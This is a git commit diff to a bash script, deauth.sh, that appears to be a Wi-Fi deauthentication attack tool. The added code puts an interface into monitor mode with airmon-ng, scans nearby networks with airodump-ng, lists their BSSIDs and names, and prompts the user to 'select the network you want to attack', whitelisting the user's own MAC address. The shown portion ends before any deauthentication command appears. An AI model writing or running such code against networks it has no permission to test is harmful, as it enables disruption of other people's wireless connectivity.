a5e75298bed5bc5c0164bb09effa370bb24bdaa4
AntiVlad <vladnyash@gmail.com>
2023-12-02 17:35:48 +0100

    Update deauth.sh

--- deauth.sh
+++ deauth.sh
@@ -2,14 +2,30 @@
 echo 'Your network interface name?'
 read interface
 
-INTERFACE= $interface
+airmon-ng start $interface
+airodump-ng $interface
 
-echo 'Victim network BSSID'
-read bssid
-BSSID=$bssid
+cmd=$(airodump-ng --output-format csv -c 6 $interface)
 
-echo 'Your mac address'
-read mac
+bssids=($(echo "$cmd" | tail -n +3 | awk -F ',' '{print $1}'))
+essids=($(echo "$cmd" | tail -n +3 | awk -F ',' '{print $4}'))
+
+echo "Available Wi-Fi Networks:"
+for ((i=0; i<${#bssids[@]}; i++)); do
+  echo "$((i+1)). ${bssids[i]} - ${essids[i]}"
+done
+
+read -p 'Select the network you want to attack: ' selection
+
+if [[ ! $selection =~ ^[0-9]+$ ]] || ((selection < 1)) || ((selection > ${#bssids[@]})); then
+  echo "Invalid selection. Exiting."
+  exit 1
+fi
+
+
+bssid=${bssids[selection-1]}
+
+mac=$(ifconfig "$interface" | awk '/ether/ {print $2}')
+
 WHITELIST=(mac)
-
 
